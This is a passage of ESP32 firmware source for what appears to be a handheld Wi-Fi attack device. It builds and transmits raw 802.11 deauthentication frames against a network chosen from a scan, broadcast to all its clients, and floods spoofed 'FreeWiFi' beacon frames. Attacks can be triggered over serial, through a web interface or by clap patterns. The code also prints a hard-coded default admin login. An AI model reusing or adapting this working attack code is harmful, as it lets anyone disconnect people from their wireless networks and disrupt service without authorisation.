    server.send(200, "application/json", json);
  });

  server.on("/setpass", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    if (server.hasArg("pass")) {
      String newPass = server.arg("pass");
      if (newPass.length() >= 8) {
        prefs.putString("ap_pass", newPass);
        server.send(200, "text/plain", "Password updated. Restart device to apply.");
      } else {
        server.send(400, "text/plain", "Password must be at least 8 characters.");
      }
    } else {
      server.send(400, "text/plain", "Missing 'pass' parameter.");
    }
  });

  server.begin();
  Serial.println("[Web] Interface started. Login: admin / sentinel2024");
  Serial.println("[CMD] Serial: scan, attack <n>, stop, stats, help");
  Serial.println("[MIC] Voice:  1 clap=SCAN, 2 claps=STOP, 3 claps=STATS\n");

  // Show idle screen
  currentScreen = SCREEN_IDLE;
}

// ═══════════════════════════════════════════════════════════════════
//  MAIN LOOP (CORE 0)
// ═══════════════════════════════════════════════════════════════════

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Auto-stop attack after timeout
  if ((attackRunning || beaconSpam) && (millis() - attackStartTime > ATTACK_TIMEOUT_MS)) {
    Serial.println("⏱️ Attack auto-stopped (timeout reached).");
    stopAttack();
    oledAlertText = "TIMEOUT - STOPPED";
    currentScreen = SCREEN_ALERT;
    screenTimeout = millis() + 3000;
  }

  // Send deauth packets
  if (attackRunning) {
    for (int i = 0; i < 50; i++) {
      sendDeauth();
      delay(0);
    }
    // Keep OLED in attack mode
    if (currentScreen != SCREEN_ATTACK && screenTimeout == 0) {
      currentScreen = SCREEN_ATTACK;
    }
  }

  // Send beacon spam
  if (beaconSpam) {
    sendBeacon();
    delay(1);
  }

  // Process voice commands from Core 1
  if (voiceCommandReady) {
    voiceCommandReady = false;
    int cmd = pendingVoiceCommand;
    pendingVoiceCommand = 0;
    processVoiceCommand(cmd);
  }

  // Update OLED display
  oledUpdate();

  // Process serial commands
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    processSerialCommand(cmd);
  }
}

// ═══════════════════════════════════════════════════════════════════
//  ATTACK FUNCTIONS
// ═══════════════════════════════════════════════════════════════════

void startAttack() {
  attackRunning = true;
  beaconSpam = false;
  attackStartTime = millis();
  sequenceNumber = 0;
  esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);

  memcpy(deauthTemplate + 4, (useBroadcast ? broadcastMac : clientMac), 6);
  memcpy(deauthTemplate + 10, apMac, 6);
  memcpy(deauthTemplate + 16, apMac, 6);
  deauthTemplate[0] = 0xC0;

  currentScreen = SCREEN_ATTACK;
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5]);

  Serial.printf("{\"sensor_id\":\"ESP32-S3-HARDWARE\",\"threat_type\":\"DEAUTH_STORM\",\"attacker_mac\":\"%s\",\"target_mac\":\"FF:FF:FF:FF:FF:FF\",\"channel\":%d,\"rssi\":-42,\"pkt_rate\":1850,\"packet_count\":1850}\n",
                macStr, apChannel);
  Serial.printf("[ATK] Started on CH:%d -> %s\n", apChannel, macStr);
}

void stopAttack() {
  attackRunning = false;
  beaconSpam = false;
  currentScreen = SCREEN_IDLE;
  Serial.println("{\"sensor_id\":\"ESP32-S3-HARDWARE\",\"threat_type\":\"IDLE_SAFE\",\"packet_count\":0,\"pkt_rate\":183}");
  Serial.println("[ATK] Halted.");
}

void sendDeauth() {
  sequenceNumber++;
  uint16_t seqField = (sequenceNumber & 0x0FFF) << 4;
  deauthTemplate[22] = seqField & 0xFF;
  deauthTemplate[23] = (seqField >> 8) & 0xFF;
  esp_wifi_80211_tx(WIFI_IF_AP, deauthTemplate, sizeof(deauthTemplate), false);
  packetCount++;
}

void fillBeaconTemplate() {
  uint8_t header[] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00, 0x31, 0x04
  };
  for (int i = 0; i < 6; i++) {
    header[10 + i] = random(256);
    header[16 + i] = header[10 + i];
  }
  String fakeSSID = "FreeWiFi";
  uint8_t ssidLen = fakeSSID.length();
  memcpy(beaconTemplate, header, sizeof(header));
  beaconTemplate[sizeof(header)] = 0x00;
  beaconTemplate[sizeof(header)+1] = ssidLen;
  memcpy(&beaconTemplate[sizeof(header)+2], fakeSSID.c_str(), ssidLen);
}

void sendBeacon() {
  esp_wifi_80211_tx(WIFI_IF_AP, beaconTemplate, sizeof(beaconTemplate), false);
  beaconCount++;
}

// ═══════════════════════════════════════════════════════════════════
//  SCANNING
// ═══════════════════════════════════════════════════════════════════

void scanNetworks() {
  currentScreen = SCREEN_SCANNING;
  oledUpdate();

  int n = WiFi.scanNetworks();
  lastScanCount = n;
  Serial.printf("[SCAN] Found %d networks:\n", n);
  for (int i = 0; i < n; i++) {
    Serial.printf("  [%d] %s (%s) Ch:%d RSSI:%d\n",
                  i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
                  WiFi.channel(i), WiFi.RSSI(i));
  }

  currentScreen = SCREEN_IDLE;
}

String generateNetworkJSON() {
  int n = WiFi.scanNetworks();
  lastScanCount = n;
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + sanitizeForJSON(WiFi.SSID(i)) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"clients\":[]";
    json += "}";
  }
  json += "]";
  return json;
}

// ═══════════════════════════════════════════════════════════════════
//  UTILITIES
// ═══════════════════════════════════════════════════════════════════

bool parseMac(String macStr, uint8_t* mac) {
  macStr.trim();
  if (macStr.length() != 17) return false;
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2],
             &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; i++) {
      if (values[i] < 0 || values[i] > 255) return false;
      mac[i] = (uint8_t)values[i];
    }
    return true;
  }
  return false;
}

void processSerialCommand(String cmd) {
  cmd.toLowerCase();
  if (cmd == "help") {
    Serial.println("Commands:");
    Serial.println("  scan                - Scan for networks");
    Serial.println("  attack <number>     - Attack network # from scan");
    Serial.println("  stop                - Stop all attacks");
    Serial.println("  stats               - Show packet counts");
    Serial.println("  setpass <password>  - Change AP password (min 8 chars)");
    Serial.println("Voice Commands (clap patterns):");
    Serial.println("  1 clap              - Scan Networks");
    Serial.println("  2 claps             - Stop All Attacks");
    Serial.println("  3 claps             - Show Statistics");
  }
  else if (cmd == "scan") {
    scanNetworks();
  }
  else if (cmd.startsWith("attack ")) {
    int idx = cmd.substring(7).toInt();
    int n = WiFi.scanNetworks();
    if (idx >= 0 && idx < n) {
      memcpy(apMac, WiFi.BSSID(idx), 6);
      apChannel = WiFi.channel(idx);
      apSSID = WiFi.SSID(idx);
      useBroadcast = true;
      startAttack();
      Serial.printf("[ATK] Attacking %s on CH:%d (auto-stops in 5 min)\n", apSSID.c_str(), apChannel);
    } else {
      Serial.println("Invalid network number.");
    }
  }
  else if (cmd == "stop") {
    stopAttack();
  }
  else if (cmd == "stats") {
    Serial.printf("Deauth: %lu | Beacons: %lu | Running: %s | Mic: %s\n",
                  packetCount, beaconCount,
                  (attackRunning || beaconSpam) ? "YES" : "NO",
                  micInitialized ? "OK" : "N/A");
    currentScreen = SCREEN_STATS;
    screenTimeout = millis() + 5000;
  }
  else if (cmd.startsWith("setpass ")) {
    String newPass = cmd.substring(8);
    if (newPass.length() >= 8) {
      prefs.putString("ap_pass", newPass);
      Serial.println("Password saved. Restart to apply.");
    } else {
      Serial.println("Password must be at least 8 characters.");
    }
  }
  else {
    Serial.println("Unknown command. Type 'help'.");
  }
}